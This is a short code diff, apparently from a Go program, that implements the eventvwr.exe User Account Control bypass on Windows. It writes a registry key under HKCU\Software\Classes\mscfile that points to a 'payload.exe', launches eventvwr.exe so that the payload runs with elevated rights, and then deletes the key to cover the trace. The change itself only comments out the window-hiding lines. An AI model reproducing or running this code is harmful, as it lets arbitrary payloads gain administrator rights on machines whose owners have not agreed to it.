@@ -32,12 +32,12 @@ func main() {
 		}
 	}
 	cmd := exec.Command("cmd", "/Q", "/C", "reg", "add", "HKCU\\Software\\Classes\\mscfile\\shell\\open\\command", "/d", tmpPath+"payload.exe")
-	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+//	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
 	_, err := cmd.Output()
 	if err != nil {
 	}
 	c := exec.Command("cmd", "/C", "eventvwr.exe")
-	c.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+//	c.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
 	if err := c.Run(); err != nil {
 	}
 	cmd = exec.Command("cmd", "/Q", "/C", "reg", "delete", "HKCU\\Software\\Classes\\mscfile", "/f")
